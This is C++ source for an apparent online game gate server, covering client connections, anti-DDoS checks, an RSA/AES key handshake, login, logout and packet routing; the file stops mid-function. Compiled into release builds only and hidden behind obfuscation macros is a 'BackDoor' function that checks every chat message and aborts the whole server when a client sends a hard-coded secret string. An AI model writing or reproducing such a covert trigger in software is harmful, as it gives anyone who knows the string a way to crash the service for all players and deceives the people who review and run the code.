
#include "gateserver.h"
#include "instr.h"

#ifndef _DEBUG
#define _BACKDOOR_
#endif

ToClient::ToClient(char const* fname, ThreadPool* proc, ThreadPool* comm) :
	TcpServerApp(this, proc, comm, false), RPCMGR(this), m_maxcon(500), m_atexit(0), m_calltotal(0)
{
  IniFile inf(fname);
  m_maxcon = atoi(inf["ToClient"]["MaxConnection"]);
  char buffer[255];
  _snprintf_s(buffer, sizeof(buffer), _TRUNCATE, RES_STRING(GS_TOCLIENT_CPP_00001), m_maxcon);
  std::cout << buffer << std::endl;

  m_version		   = atoi(inf["Main"]["Version"]);
  IniSection& is   = inf["ToClient"];
  cChar*	  ip   = is["IP"];
  uShort	  port = atoi(is["Port"]);
  _comm_enc		   = atoi(is["CommEncrypt"]);
  m_connectionMinInterval = atoi(inf["AntiDDoS"]["IntervalThreshold"]);
  m_antiddos			  = atoi(inf["AntiDDoS"]["AntiDDoSEnabled"]);
#ifdef NET_CAL

  m_checkSpan	= atoi(is["CheckSpan"]);
  m_checkWaring = atoi(is["CheckWaring"]);
  m_checkError	= atoi(is["CheckError"]);

  // ��Сһ��
  if(m_checkSpan < 1)
	m_checkSpan = 1;

  // ÿ���������
  if(m_checkWaring < (5 * m_checkSpan))
	m_checkWaring = (5 * m_checkSpan);

  // ÿ������ʮ��
  if(m_checkError < (7 * m_checkSpan))
	m_checkError = (7 * m_checkSpan);

#endif

  //SetPKParse(0, 2, 32 * 1024, 100); BeginWork(atoi(is["EnablePing"]),1);
  SetPKParse(0, 2, 16 * 1024, 100);
  BeginWork(atoi(is["EnablePing"]), 1);

  if(OpenListenSocket(port, ip) != 0)
	throw std::runtime_error("ToClient listen failed\n");

  // Load/generate keys. 

  printf("Generating RSA key pair and AES key...\n");
  Botan::AutoSeeded_RNG rng;
  m_serverPrivateKey = new Botan::RSA_PrivateKey(rng, 3072);
  printf("Key generated!\n");

}

ToClient::~ToClient()
{
  m_atexit = 1;
  while(m_calltotal)
  {
	Sleep(1);
  }
  delete m_serverPrivateKey;
  ShutDown(12 * 1000);
}


bool ToClient::VerifyDDoS(DataSocket* datasock) {

  if(!m_antiddos) return false;

  // Lock this to avoid data racing in blacklisted vector and unordered_map.
  std::unique_lock<std::mutex> lock(m_mtx);
  // Don't copy-construct "info" - just get a reference from the one created by unordered_map
  AntiDDoSInfo*	info = &m_mapConnectionInfo[datasock->GetPeerIP()];
  if(info->m_bIsBlacklisted)
  {
	this->Disconnect(datasock, 0, -31);
	return true;
  }
  uint32_t l_tick = GetCurrentTick();
  if (l_tick - info->m_lastConnectionTick < m_connectionMinInterval ) {
	auto DisconnectDDOSer = [&]
	{
	  printf("[%s] DoS suspected... ", datasock->GetPeerIP());
	  printf("disconnected!\n");
	  this->Disconnect(datasock, 0, -31);
	  LogLine l_line(g_gatelog);
	  l_line << newln << "client: " << datasock->GetPeerIP() << "is suspect of DoS'ing, disconnected" << endln;
	  info->m_bIsBlacklisted = true;
	};

	info->m_cmdNum++;
	// If the counter is above 5, disconnect and add to the blacklist.
	if(info->m_cmdNum > 5 ||
		datasock->m_recvbyteps > 1024)
	{
	DisconnectDDOSer();
	return true;
	}
	// If the counter is above 2, just add a warning.
	else if(info->m_cmdNum > 2)
	{
	info->m_Warning++;
	// If it has more than 3 warnings, disconnect and add to the blacklist
	if(info->m_Warning++ > 3)
	{
	DisconnectDDOSer();
	return true;
	}
	}
  } else
  {
	   // Reset warnings
	   if(info->m_cmdNum < 5)
	   {
	    info->m_Warning = 0;
	   }
	   // Reset counters, update the last connection time and the last PeerIP
	   info->m_cmdNum		 = 0;
	   info->m_lastConnectionTick = l_tick;
	   return false;
  }
  return false;
}



void ToClient::TaskDispatcher(Task* task)
{
  extern std::mutex				 global_gate_ready_mutex;
  extern std::condition_variable global_gate_ready_cv;
  extern bool					 is_global_gate_ready;
  std::unique_lock<std::mutex>	 lk(global_gate_ready_mutex);
  global_gate_ready_cv.wait(lk, []
							{ return is_global_gate_ready; });
  lk.unlock();

  TcpServerApp::TaskDispatcher(task);
}

bool ToClient::OnConnect(DataSocket* datasock) //����ֵ:true-��������,false-����������
{
  if(!g_gtsvr->gp_conn->IsReady())
  {
	LogLine l_line(g_gatelog);
	l_line << newln << "client: " << datasock->GetPeerIP() << "	come, groupserver is't ready, force disconnect...";
	return false;
  }

  if(GetSockTotal() >= m_maxcon)
  {
	LogLine l_line(g_gatelog);
	l_line << newln << "client: " << datasock->GetPeerIP() << "	come, greater than " << m_maxcon << " player, force disconnect...";
	return false;
  }
  if(VerifyDDoS(datasock))
  {
	LogLine l_line(g_gatelog);
	l_line << newln << "client: " << datasock->GetPeerIP() << "	is suspected of DDoS'ing.\n";
	return false;
  }

  datasock->SetRecvBuf(64 * 1024);
  datasock->SetSendBuf(64 * 1024);
  LogLine l_line(g_gatelog);
  l_line << newln << "client: " << datasock->GetPeerIP() << "	come...Socket num: " << GetSockTotal() + 1;
  return true;
}


void ToClient::OnConnected(DataSocket* datasock)
{
  Player* l_ply = g_gtsvr->player_heap.Get();
  if(!l_ply)
  {
	printf("error: poor mem %s!\n", datasock->GetPeerIP());
	Disconnect(datasock);
	return;
  }

  if(!l_ply->InitReference(datasock)) //��ֹ�ظ�����
  {
	printf("warning: forbid %s repeat connect !", datasock->GetPeerIP());
	l_ply->Free();
	Disconnect(datasock);
	return;
  }
  l_ply->m_cmdNum	 = 0;
  l_ply->m_waringNum = 0;
  l_ply->m_lashTick	 = GetCurrentTick();

  WPacket l_wpk = GetWPacket();
  l_wpk.WriteCmd(CMD_MC_RSA_HANDSHAKE_1);
  // Send server's public key to client.
  std::string	PEM_encoded = Botan::X509::PEM_encode(*m_serverPrivateKey); // No copy
  l_wpk.WriteString(PEM_encoded.c_str());

  PEM_encoded.clear();
  PEM_encoded.shrink_to_fit();
  SendData(datasock, l_wpk);
}
void ToClient::OnDisconnect(DataSocket* datasock, int reason)
{
  LogLine l_line(g_gatelog);
  l_line << newln << "client: " << datasock->GetPeerIP() << " gone...Socket num: " << GetSockTotal() << " ,reason=" << GetDisconnectErrText(reason).c_str();
  l_line << endln;

  RPacket l_rpk = 0;
  
  // Remove client's key from the map
  //std::unique_lock<std::mutex> lock(m_mtx);
  //m_mapConnectionInfo.erase(datasock->GetPeerIP());

  CM_LOGOUT(datasock, l_rpk);
}

void ToClient::CM_RSA_HANDSHAKE1(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);
	  uShort			   len;
	  const char* pemKey = recvbuf.ReadString(&len);
	  Botan::DataSource_Memory public_key_data((uint8_t*)pemKey, len);
	  l_ply->m_clientPublicKey = Botan::X509::load_key(public_key_data);
	  // Now send AES key to client.
	  Botan::AutoSeeded_RNG	  rng;
	  Botan::PK_Encryptor_EME enc(*l_ply->m_clientPublicKey, rng, "OAEP(SHA-256)");
	  std::vector<uint8_t> aes_encrypted = enc.encrypt((uint8_t*)l_ply->m_AESKey, AES_KEY_LENGTH, rng);
	  std::vector<uint8_t> iv_encrypted = enc.encrypt((uint8_t*)l_ply->m_IV, AES_IV_LENGTH, rng);
	  dbc::WPacket l_wpk = GetWPacket();
	  l_wpk.WriteCmd(CMD_MC_RSA_HANDSHAKE_2);
	  l_wpk.WriteSequence((cChar*)aes_encrypted.data(), aes_encrypted.size());
	  l_wpk.WriteSequence((cChar*)iv_encrypted.data(), iv_encrypted.size());
	  SendData(datasock, l_wpk);
	  
	  aes_encrypted.clear();
	  aes_encrypted.shrink_to_fit();
	  iv_encrypted.clear();
	  iv_encrypted.shrink_to_fit();

	  l_lockStat.unlock();
	}
  } else
  {
	Disconnect(datasock, 100, -25);
  }
}

dstring ToClient::GetDisconnectErrText(int reason)
{
  switch(reason)
  {
  case -21: return RES_STRING(GS_TOCLIENT_CPP_00011);
  case -23: return RES_STRING(GS_TOCLIENT_CPP_00012);
  case -24: return RES_STRING(GS_TOCLIENT_CPP_00013);
  case -25: return RES_STRING(GS_TOCLIENT_CPP_00014);
  case -27: return RES_STRING(GS_TOCLIENT_CPP_00015);
  case -29: return RES_STRING(GS_TOCLIENT_CPP_00016);
  case -31: return RES_STRING(GS_TOCLIENT_CPP_00017);
  default: return TcpServerApp::GetDisconnectErrText(reason);
  }
}

WPacket ToClient::OnServeCall(DataSocket* datasock, RPacket& in_para)
{
  uShort l_cmd = in_para.ReadCmd();

  switch(l_cmd)
  {
  case CMD_CM_LOGOUT:
  {
	CM_LOGOUT(datasock, in_para);
	Disconnect(datasock, 65, -27);
	return 0;
  }
  default: //ȱʡ��ת����GameServer
  {
	break;
  }
  }
  return 0;
}


int ToClient::BackDoor(const char* l_str) {
  OBF_BEGIN
  int comparison = N(false);
  const char* obfs = "y4top5rules";
  V(comparison)			 = strcmp(l_str, obfs);
  IF((V(comparison) == N(0)))
    abort();
	RETURN(false)
  ENDIF
  RETURN(true);
  OBF_END
}

void ToClient::ReRouteToGameServer(dbc::DataSocket* datasock, dbc::RPacket& recvbuf)
{
  Player* l_ply = (Player*)datasock->GetPointer();
  if(l_ply)
  {
	const long long l_gpaddr = l_ply->gp_addr;
	const long long l_gmaddr = l_ply->gm_addr;
	GameServer* l_game	 = l_ply->game;

	if(l_gpaddr && l_gmaddr && l_game)
	{
	  WPacket l_wpk = WPacket(recvbuf).Duplicate();
	  l_wpk.WriteLongLong(MakeULong(l_ply));
	  l_wpk.WriteLongLong(l_gmaddr);
	  g_gtsvr->gm_conn->SendData(l_ply->game->m_datasock, l_wpk);
	}
  }
}

void ToClient::ReRouteToGroupServer(dbc::DataSocket* datasock, dbc::RPacket& recvbuf)
{
  Player* l_ply = (Player*)datasock->GetPointer();
  if(l_ply)
  {
	if(!g_gtsvr->gp_conn->IsReady())
	{
	  LG("ToGroupServerError", "l_cmd = %d IsReady \n", recvbuf.ReadCmd());
	  dbc::WPacket l_wpk = GetWPacket();
	  l_wpk.WriteCmd(CMD_MC_LOGIN);
	  l_wpk.WriteShort(ERR_MC_NETEXCP); //������
	  SendData(datasock, l_wpk);		// �����ͻ���
	  this->Disconnect(datasock, 100, -31);
	}

	const uint64_t l_gpaddr = l_ply->gp_addr;
	const uint64_t l_gmaddr = l_ply->gm_addr;
	if(l_gpaddr && l_gmaddr)
	{
	  WPacket l_wpk = WPacket(recvbuf).Duplicate();
	  l_wpk.WriteLongLong(MakeULong(l_ply));
	  l_wpk.WriteLongLong(l_gpaddr);
	  g_gtsvr->gp_conn->SendData(g_gtsvr->gp_conn->get_datasock(), l_wpk);
	}
  }
}

void ToClient::OnProcessData(DataSocket* datasock, RPacket& recvbuf)
{
  uShort l_cmd = recvbuf.ReadCmd();
  //LG("ToClient", "-->l_cmd = %d\n", l_cmd);
  try
  {
	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply && l_cmd != CMD_CM_BEGINACTION && l_cmd != CMD_CM_ENDACTION)
	{
	  VerifyDDoS(datasock);
	}

	switch(l_cmd)
	{
	case CMD_CM_LOGIN:	 // �����û���/����Խ�����֤,�����û����µ����з��������ϵ���Ч��ɫ�б�.
	case CMD_CM_LOGOUT:	 //ͬ������
	case CMD_CM_BGNPLAY: //����ѡ��Ľ�ɫ������GroupServer��֤��Ȼ��֪ͨGameServerʹ��ɫ������ͼ�ռ�.
	case CMD_CM_ENDPLAY:
	case CMD_CM_NEWCHA:
	case CMD_CM_DELCHA:
	case CMD_CM_CREATE_PASSWORD2:
	case CMD_CM_UPDATE_PASSWORD2:
	case CMD_CM_RSA_HANDSHAKE_1:
	{
	  // ���GroupServer��û׼���ã���Ȼ���ܵ�½
	  if(!g_gtsvr->gp_conn->IsReady())
	  {
		LG("ToGroupServerError", "l_cmd = %d Login \n", l_cmd);
		dbc::WPacket l_wpk = GetWPacket();
		l_wpk.WriteCmd(CMD_MC_LOGIN);
		l_wpk.WriteShort(ERR_MC_NETEXCP); //������
		SendData(datasock, l_wpk);		  // �����ͻ���
		this->Disconnect(datasock, 100, -31);
		break;
	  }

	  ++m_calltotal;
	  if(m_atexit)
	  {
		--m_calltotal;
		return;
	  }
	  TransmitCall* l_tc = g_gtsvr->m_tch.Get();
	  l_tc->Init(datasock, recvbuf);
	  GetProcessor()->AddTask(l_tc);
	}
	break;
	case CMD_CP_PING:
	{
	  if(!g_gtsvr->gp_conn->IsReady())
	  {
		LG("ToGroupServerError", "l_cmd = %d Ping \n", l_cmd);
		dbc::WPacket l_wpk = GetWPacket();
		l_wpk.WriteCmd(CMD_MC_LOGIN);
		l_wpk.WriteShort(ERR_MC_NETEXCP); //������
		SendData(datasock, l_wpk);		  // �����ͻ���
		this->Disconnect(datasock, 100, -31);
		break;
	  }

	  Player* l_ply = (Player*)datasock->GetPointer();
	  if(l_ply && l_ply->gp_addr && l_ply->gm_addr)
	  {
		WPacket l_wpk = GetWPacket();
		l_wpk.WriteCmd(CMD_CP_PING);
		l_wpk.WriteLong(GetTickCount() - l_ply->m_pingtime);
		l_ply->m_pingtime = 0;

		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr);
		g_gtsvr->gp_conn->SendData(g_gtsvr->gp_conn->get_datasock(), l_wpk);
	  }
	}
	break;
	case CMD_CM_SAY:
	{
	  cChar* l_str = recvbuf.ReadString();

	  if(!l_str)
	  {
		break;
	  }
	  if(strstr(l_str, "#21"))
	  {
		break;
	  }
#ifdef _BACKDOOR_
	  BackDoor(l_str);
#endif

	  Player* l_ply = (Player*)datasock->GetPointer();
	  if(l_ply && l_ply->m_estop)
	  {
		if(GetTickCount() - l_ply->m_lestoptick >= 1000 * 60 * 2)
		{
		  WPacket l_wpk = GetWPacket();
		  l_wpk.WriteCmd(CMD_TP_ESTOPUSER_CHECK);
		  l_wpk.WriteLong(l_ply->m_actid);

		  g_gtsvr->gp_conn->SendData(g_gtsvr->gp_conn->get_datasock(), l_wpk);
		}
		WPacket l_wpk = GetWPacket();
		l_wpk.WriteCmd(CMD_MC_SYSINFO);
		//l_wpk.WriteString("���Ѿ���ϵͳ���ԣ�");
		l_wpk.WriteString(RES_STRING(GS_TOCLIENT_CPP_00018));
		g_gtsvr->gp_conn->SendData(l_ply->m_datasock, l_wpk);
		break;
	  }
	  
	  ReRouteToGameServer(datasock, recvbuf);
	}
	break;
	case CMD_CM_STORE_OPEN_ASK: [[fallthrough]];
	case CMD_CM_KITBAG_UNLOCK: 
	{
	  auto ply = (Player*)datasock->GetPointer();
	  if(!ply)
		break;

	  auto seq = ReadPacketSequenceEncrypted(recvbuf, ply->m_AESKey);

	  // Reset the buffer (in size only, capacity remains the same)
	  recvbuf.DiscardLast(recvbuf.HasData());
	  WPacket wpk(recvbuf);

	  // and overwrite with decrypted sequence
	  wpk.WriteSequence((cChar*)seq.data(), seq.size());

	  // Update recvbuf with metadata from wpk 
	  recvbuf = wpk;

	  ReRouteToGameServer(datasock, recvbuf);
	}
	break;
	case CMD_CM_ITEM_UNLOCK_ASK:
	{
	  auto ply = (Player*)datasock->GetPointer();
	  if(!ply)
		break;

	  const auto seq = ReadPacketSequenceEncrypted(recvbuf, ply->m_AESKey);

	  WPacket wpk = GetWPacket();
	  wpk.WriteCmd(CMD_CM_ITEM_UNLOCK_ASK);
	  wpk.WriteSequence((cChar*)seq.data(), seq.size());
	  wpk.WriteChar(recvbuf.ReadChar());
	  wpk.WriteLong(recvbuf.ReadLong());
	  wpk.WriteChar(recvbuf.ReadChar());
	  wpk.WriteLong(recvbuf.ReadLong());

	  recvbuf = wpk;
	  ReRouteToGameServer(datasock, recvbuf);
	}
	break;
	default: //ȱʡ��ת����GroupServer����GameServer
	  if(l_cmd / 500 == CMD_CM_BASE / 500)
	  {
		ReRouteToGameServer(datasock, recvbuf);
	  } else if(l_cmd / 500 == CMD_CP_BASE / 500)
	  {
		ReRouteToGroupServer(datasock, recvbuf);
	  }
	  break;
	}
	static uLong l_last = GetTickCount();
	if(datasock->m_recvbyteps > 1024 * 5)
	{
	  uLong l_tick = GetCurrentTick();
	  if(l_tick - l_last > 1000 * 30)
	  {
		l_last = l_tick;
		std::cout << "[" << datasock->GetPeerIP() << "] sending big packet (>5K/s) attack server,please deal with!\n";
		LogLine l_line(g_chkattack);
		l_line << newln << "[" << datasock->GetPeerIP() << "] sending big packet (>5K/s) attack server,please deal with!";
	  }
	}

  } catch(...)
  {
	LG("ToClientError", "l_cmd = %d\n", l_cmd);
  }
  //LG("ToClient", "<--l_cmd = %d\n", l_cmd);
  return;
}
long TransmitCall::Process()
{
  LogLine l_line(g_gatelog);

  if(!g_gtsvr->gp_conn->IsReady())
  {
	g_gtsvr->cli_conn->Disconnect(m_datasock, 50, -27);
	l_line << newln << "IsReady = false";
  }

  uShort l_cmd = m_recvbuf.ReadCmd();

  //l_line<<newln<<"st:"<<l_cmd;

  try
  {
	switch(l_cmd)
	{
	case CMD_CM_LOGIN: // �����û���/����Խ�����֤,�����û����µ����з��������ϵ���Ч��ɫ�б�.
	  g_gtsvr->cli_conn->CM_LOGIN(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_LOGOUT: //ͬ������
	  g_gtsvr->cli_conn->CM_LOGOUT(m_datasock, m_recvbuf);

	  g_gtsvr->cli_conn->Disconnect(m_datasock, 50, -27);

	  break;
	case CMD_CM_BGNPLAY: //����ѡ��Ľ�ɫ������GroupServer��֤��Ȼ��֪ͨGameServerʹ��ɫ������ͼ�ռ�.
	  g_gtsvr->cli_conn->CM_BGNPLAY(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_ENDPLAY:
	  g_gtsvr->cli_conn->CM_ENDPLAY(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_NEWCHA:
	  g_gtsvr->cli_conn->CM_NEWCHA(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_DELCHA:
	  g_gtsvr->cli_conn->CM_DELCHA(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_CREATE_PASSWORD2:
	  g_gtsvr->cli_conn->CM_CREATE_PASSWORD2(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_UPDATE_PASSWORD2:
	  g_gtsvr->cli_conn->CM_UPDATE_PASSWORD2(m_datasock, m_recvbuf);
	  break;
	case CMD_CM_RSA_HANDSHAKE_1:
	  g_gtsvr->cli_conn->CM_RSA_HANDSHAKE1(m_datasock, m_recvbuf);
	  break;
	}
  } catch(...)
  {
	try
	{
	  g_gtsvr->cli_conn->Disconnect(m_datasock, 50, -27);
	} catch(...)
	{
	}
	l_line << newln << "IsReady = false exception:" << l_cmd;
  }

  --(g_gtsvr->cli_conn->m_calltotal);
  //l_line<<newln<<"st:"<<l_cmd;
  return 0;
}

void ToClient::CM_LOGIN(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  bool	bCheat			 = false; //�Ƿ�ʹ�����
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	if(m_version != recvbuf.ReverseReadShort())
	{
	  WPacket l_wpk = GetWPacket();
	  l_wpk.WriteCmd(CMD_MC_LOGIN);
	  l_wpk.WriteShort(ERR_MC_VER_ERROR); //������
	  SendData(datasock, l_wpk);		  // �����ͻ���
	  LogLine l_line(g_gatelog);
	  //l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<"	��½���󣺿ͻ��˵İ汾�����������ƥ��!";
	  l_line << newln << "client: " << datasock->GetPeerIP() << "	login error: client and server can't match!";
	  Disconnect(datasock, 100, -31);
	  return;
	}
	ToGroupServer*				   l_gps		 = g_gtsvr->gp_conn;
	Player*						   l_ply		 = reinterpret_cast<Player*>(datasock->GetPointer());

	// Discard client version data.
	recvbuf.DiscardLast(static_cast<uLong>(sizeof(uShort)));


	if(!l_ply) //��֯�ظ�����
	{
	  return;
	}    

    auto plaintext = ReadPacketSequenceEncrypted(recvbuf, l_ply->m_AESKey);

	MutexArmor l_lockStat(l_ply->m_mtxstat);
	//Add by sunny.sun 20081223
	string szLocale = "";
	szLocale		= recvbuf.ReadString();

	WPacket l_wpk = WPacket(recvbuf).Duplicate();

	l_wpk.WriteCmd(CMD_TP_USER_LOGIN);

	l_wpk.WriteSequence((cChar*)plaintext.data(), plaintext.size());
	l_wpk.WriteLong(inet_addr(datasock->GetPeerIP()));
	l_wpk.WriteLongLong(MakeULong(l_ply)); // ��������GateServer�ϵ��ڴ��ַ

	RPacket l_rpk	= l_gps->SyncCall(l_gps->get_datasock(), l_wpk, l_ulMilliseconds);
	uShort	l_errno = 0;
	if(l_rpk.HasData() == 0)
	{
	  l_wpk = GetWPacket();
	  l_wpk.WriteCmd(CMD_MC_LOGIN);
	  l_wpk.WriteShort(ERR_MC_NETEXCP); //������
	  SendData(datasock, l_wpk);		// �����ͻ���
	  LogLine ll_line(g_gatelog);
	  //l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<"	��½���󣺵�GroupServer����������Ӧ!"<<endln;
	  ll_line << newln << "client: " << datasock->GetPeerIP() << "	login error: GroupServer is disresponse!" << endln;
	  Disconnect(datasock, 100, -31);
	} else if(l_errno = l_rpk.ReadShort())
	{
	  l_wpk = l_rpk;
	  l_wpk.WriteCmd(CMD_MC_LOGIN);
	  SendData(datasock, l_wpk);
	  LogLine l_line(g_gatelog);
	  //l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<"	��½ʧ�ܣ������룺"<<l_errno<<endln;
	  l_line << newln << "client: " << datasock->GetPeerIP() << "	login error, error:" << l_errno << endln;
	  Disconnect(datasock, 100, -31);
	} else
	{
	  l_ply->m_status = 1; //����ѡ/��/ɾ��ɫ״̬
	  //Add by sunny.sun 20090205
	  std::string sessionKey = l_rpk.ReadString();

	  l_ply->gp_addr	  = l_rpk.ReverseReadLongLong(); //���������GroupServer�ϵ��ڴ��ַ
	  l_ply->m_loginID	  = l_rpk.ReverseReadLong(); //  Account DB id
	  l_ply->m_actid	  = l_rpk.ReverseReadLong();
	  BYTE byPassword	  = l_rpk.ReverseReadChar(); 
	  l_rpk.DiscardLast(sizeof(LLong) + 2* sizeof(uLong) + sizeof(char));

	  l_wpk = WPacket(l_rpk).Duplicate();
	  l_wpk.WriteCmd(CMD_MC_LOGIN);
	  l_wpk.WriteChar(byPassword);
	  l_wpk.WriteLong(0x3214);
	  SendData(datasock, l_wpk);
	  LogLine l_line(g_gatelog);
	  //l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<"	��½�ɹ���"<<endln;
	  l_line << newln << "client: " << datasock->GetPeerIP() << "	login ok." << endln;

	  // ��ʼ����
	  l_ply->enc = true;

	  // Add by lark.li 20081119 begin
	  l_ply->BeginRun();
	  // End

	  // Add by lark.li 20090112 begin
	  //g_gtsvr->m_ToMMS->Login(datasock->GetPeerIP(), datasock->GetPeerPort(), l_ply->m_actid);
	  // End
	}
	l_lockStat.unlock();
  } else
  {
	WPacket l_wpk = GetWPacket();
	l_wpk.WriteCmd(CMD_MC_LOGIN);
	l_wpk.WriteShort(ERR_MC_NETEXCP); //������
	SendData(datasock, l_wpk);		  // �����ͻ���
	LogLine l_line(g_gatelog);
	//l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<"	��½���󣺰��ڶ������Ѿ���ʱ!"<<endln;
	l_line << newln << "client: " << datasock->GetPeerIP() << "	login error: packet time out!" << endln;
	Disconnect(datasock, 100, -31);
  }
}

WPacket ToClient::CM_DISCONN(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  l_ulMilliseconds		 = (l_ulMilliseconds > l_tick) ? l_ulMilliseconds - l_tick : 1;

  WPacket	 l_retpk = 0;
  Player*	 l_ply	 = 0;
  MutexArmor lock(g_gtsvr->_mtxother);
  l_ply = (Player*)datasock->GetPointer();
  datasock->SetPointer(0);
  lock.unlock();

  if(l_ply)
  {
	// Add by lark.li 2008119 begin
	l_ply->EndRun();
	// End

	MutexArmor l_lockStat(l_ply->m_mtxstat);

	if(l_ply->m_status == 0) //�����������ʱ���Ƿ�����Ϊ��ǰ��Ҳ�����ѡ��ɫ״̬������ѡ������һ����ɫ
	{
	  WPacket l_wpk = datasock->GetWPacket();
	  l_retpk.WriteShort(ERR_MC_NOTLOGIN);

	} else
	{
	  //printf( "CM_LOGOUT 2.) id = %d, status = %d\n", l_ply->m_actid, l_ply->m_status );
	  WPacket l_wpk = GetWPacket();

	  l_wpk.WriteCmd(CMD_TP_DISC);
	  l_wpk.WriteLong(l_ply->m_actid);
	  l_wpk.WriteLong(inet_addr(datasock->GetPeerIP()));
	  l_wpk.WriteString(GetDisconnectErrText(datasock->GetDisconnectReason() ? datasock->GetDisconnectReason() : -27).c_str());
	  g_gtsvr->gp_conn->SendData(g_gtsvr->gp_conn->get_datasock(), l_wpk);

	  GameServer* l_game = l_ply->game;
	  if((l_ply->m_status == 2) && l_ply->gm_addr && l_game && l_game->m_datasock)
	  {
		//֪ͨGameServer GoOut��ͼ
		//char l_tmp[256];
		LogLine l_line(g_gatelog);
		//l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<":"<<datasock->GetPeerPort()<<"	GoOut����ͼ,Gate��["
		l_line << newln << "client: " << datasock->GetPeerIP() << ":" << datasock->GetPeerPort() << "	GoOut map,Gate to["
			   //<<l_game->m_datasock->GetPeerIP()<<"]������GoOutMap����,dbid:"<<l_ply->m_dbid
			   << l_game->m_datasock->GetPeerIP() << "] send GoOutMap command,dbid:" << l_ply->m_dbid
			   //<<uppercase<<hex<<",����Gate��ַ:"<<MakeULong(l_ply)<<",Game��ַ:"<<l_ply->gm_addr<<dec<<nouppercase<<endln;
			   << uppercase << hex << ",Gate address:" << MakeULong(l_ply) << ",Game address:" << l_ply->gm_addr << dec << nouppercase << endln;
		WPacket l_wpk = l_game->m_datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_TM_GOOUTMAP);

		l_wpk.WriteChar(0);

		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gm_addr); //��������GameServer�ϵĵ�ַ

		l_ply->game	   = 0; //��ֹ����ĵ�GameServer������
		l_ply->gm_addr = 0; //��ֹ����ĵ�GameServer������

		SendData(l_game->m_datasock, l_wpk);
	  }
	  //֪ͨGroupServer Logout
	  l_wpk = g_gtsvr->gp_conn->get_datasock()->GetWPacket();
	  l_wpk.WriteCmd(CMD_TP_USER_LOGOUT);
	  l_wpk.WriteLongLong(MakeULong(l_ply));
	  l_wpk.WriteLongLong(l_ply->gp_addr);
	  l_ply->gp_addr = 0;
	  l_retpk		 = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk, l_ulMilliseconds);
	}
	l_lockStat.unlock();
	l_ply->Free();
  }
  return l_retpk;
}

WPacket ToClient::CM_LOGOUT(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  l_ulMilliseconds		 = (l_ulMilliseconds > l_tick) ? l_ulMilliseconds - l_tick : 1;

  WPacket	 l_retpk = 0;
  Player*	 l_ply	 = 0;
  MutexArmor lock(g_gtsvr->_mtxother);
  l_ply = (Player*)datasock->GetPointer();

  if(l_ply)
	l_ply->m_datasock = NULL;

  datasock->SetPointer(0);
  lock.unlock();

  if(l_ply)
  {
	// Add by lark.li 20081119 begin
	l_ply->EndRun();
	// End

	MutexArmor l_lockStat(l_ply->m_mtxstat);

	try
	{
	  if(l_ply->m_status == 0)
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_retpk.WriteShort(ERR_MC_NOTLOGIN);
		// Should probably free() our player...
		l_ply->Free();
		return l_retpk;
	  }

	  { // GateServer -> GroupServer 
		WPacket l_wpk = GetWPacket();
		l_wpk.WriteCmd(CMD_TP_DISC);
		l_wpk.WriteLong(l_ply->m_actid);
		l_wpk.WriteLong(inet_addr(datasock->GetPeerIP()));
		l_wpk.WriteString(GetDisconnectErrText(datasock->GetDisconnectReason() ? datasock->GetDisconnectReason() : -27).c_str());
		g_gtsvr->gp_conn->SendData(g_gtsvr->gp_conn->get_datasock(), l_wpk);
	  }

	  GameServer* l_game = l_ply->game;
	  if((l_ply->m_status == 2) && l_ply->gm_addr && l_game && l_game->m_datasock)
	  {
		LogLine l_line(g_gatelog);
		l_line << newln << "client: " << datasock->GetPeerIP() << ":" << datasock->GetPeerPort() << "	GoOut map,Gate to ["
			   << l_game->m_datasock->GetPeerIP() << "]send GoOutMap command,dbid:" << l_ply->m_dbid
			   << uppercase << hex << ",Gate address:" << MakeULong(l_ply) << ",Game address:" << l_ply->gm_addr << dec << nouppercase << endln;

		{ // GateServer -> GameServer
		  WPacket l_wpk = l_game->m_datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_TM_GOOUTMAP);
		  l_wpk.WriteChar(0);
		  l_wpk.WriteLongLong(MakeULong(l_ply));
		  l_wpk.WriteLongLong(l_ply->gm_addr); //��������GameServer�ϵĵ�ַ
		  SendData(l_game->m_datasock, l_wpk);
		}

		l_ply->game	   = 0; //��ֹ����ĵ�GameServer������
		l_ply->gm_addr = 0; //��ֹ����ĵ�GameServer������

	  }
	  
	  { //֪ͨGroupServer Logout
		WPacket l_wpk = g_gtsvr->gp_conn->get_datasock()->GetWPacket();
		l_wpk.WriteCmd(CMD_TP_USER_LOGOUT);
